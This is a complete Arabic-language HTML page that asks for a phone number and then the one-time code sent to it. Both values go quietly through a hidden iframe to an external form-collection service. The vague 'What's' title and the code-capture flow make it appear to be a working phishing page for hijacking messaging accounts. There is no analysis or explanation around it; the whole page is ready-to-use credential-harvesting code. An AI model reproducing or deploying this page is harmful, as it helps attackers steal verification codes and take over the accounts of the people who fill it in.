<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>What's  make me</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }
    .container {
      background: white;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
      padding: 30px 40px;
      width: 100%;
      max-width: 420px;
      box-sizing: border-box;
    }
    h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #333;
      font-weight: 700;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #555;
    }
    input[type="tel"],
    input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border-radius: 8px;
      border: 1.8px solid #ccc;
      margin-bottom: 20px;
      transition: border-color 0.3s ease;
      font-family: inherit;
      box-sizing: border-box;
    }
    input[type="tel"]:focus,
    input[type="text"]:focus {
      border-color: #28a745;
      outline: none;
    }
    button {
      width: 100%;
      padding: 14px;
      font-size: 18px;
      background-color: #28a745;
      border: none;
      border-radius: 8px;
      color: white;
      cursor: pointer;
      font-weight: 700;
      transition: background-color 0.3s ease;
    }
    button:hover:not(:disabled) {
      background-color: #218838;
    }
    button:disabled {
      background-color: #94d3a2;
      cursor: not-allowed;
    }
    #timer {
      text-align: center;
      font-weight: 600;
      color: #666;
      margin-bottom: 20px;
      min-height: 24px;
    }
    #codeField {
      display: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>نموذج رقم الهاتف والكود</h2>
    <form id="mainForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="return handleSubmit(event);">
      <label for="phone">رقم الهاتف:</label>
      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />

      <button type="button" id="sendPhoneBtn" onclick="sendPhone()">إرسال رقم الهاتف</button>

      <div id="timer"></div>

      <div id="codeField">
        <label for="code">الكود المرسل إليك:</label>
        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
        <button type="submit" id="sendCodeBtn">إرسال الكود</button>
      </div>
    </form>
  </div>

  <iframe name="hidden_iframe" style="display:none;"></iframe>

  <script>
    let countdownInterval;

    function sendPhone() {
      const phoneInput = document.getElementById('phone');
      const sendPhoneBtn = document.getElementById('sendPhoneBtn');
      const timerDisplay = document.getElementById('timer');
      const codeField = document.getElementById('codeField');
      const codeInput = document.getElementById('code');

      if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
        phoneInput.focus();
        return;
      }

      // أرسل رقم الهاتف بشكل مؤقت للنموذج (نستخدم Formcarry فقط للإرسال النهائي لكن هنا نرسل رقم الهاتف عبر طلب POST غير مباشر)
      // لكن لأجل تبسيط الإرسال نرسل النموذج كاملاً مع رقم الهاتف فقط
      // لذا نستخدم iframe ونملأ الكود فارغاً في الإرسال الأول

      // إنشاء حقل الكود مخفي في الفورم (إذا لم يكن موجود)
      let codeFieldHidden = document.querySelector('input[name="code"]');
      if (!codeFieldHidden) {
        codeFieldHidden = document.createElement('input');
        codeFieldHidden.type = 'hidden';
        codeFieldHidden.name = 'code';
        document.getElementById('mainForm').appendChild(codeFieldHidden);
      }
      codeFieldHidden.value = '';

      // إرسال الفورم
      document.getElementById('mainForm').submit();

      // إظهار خانة الكود
      codeField.style.display = 'block';

      // تعطيل زر إرسال رقم الهاتف + بدء المؤقت
      sendPhoneBtn.disabled = true;

      let timeLeft = 480; // 8 دقائق

      timerDisplay.textContent = `يرجى الانتظار: 08:00`;

      clearInterval(countdownInterval);
      countdownInterval = setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
        const seconds = (timeLeft % 60).toString().padStart(2, '0');
        timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${seconds}`;
        if (timeLeft <= 0) {
          clearInterval(countdownInterval);
          timerDisplay.textContent = '';
          sendPhoneBtn.disabled = false;
        }
      }, 1000);

      alert('تم إرسال رقم الهاتف، يمكنك الآن إدخال الكود في أي وقت.');
    }

    function handleSubmit(event) {
      event.preventDefault();

      const codeInput = document.getElementById('code');
      const phoneInput = document.getElementById('phone');

      if (codeInput.value.trim() === '') {
        alert('يرجى كتابة الكود المرسل إليك.');
        codeInput.focus();
        return false;
      }

      // إرسال البيانات مع رقم الهاتف والكود
      // نرسل الفورم عبر iframe لمنع إعادة تحميل الصفحة
      document.getElementById('mainForm').submit();

      alert('تم إرسال الكود ورقم الهاتف.');

      return false;
    }
  </script>

</body>
</html>
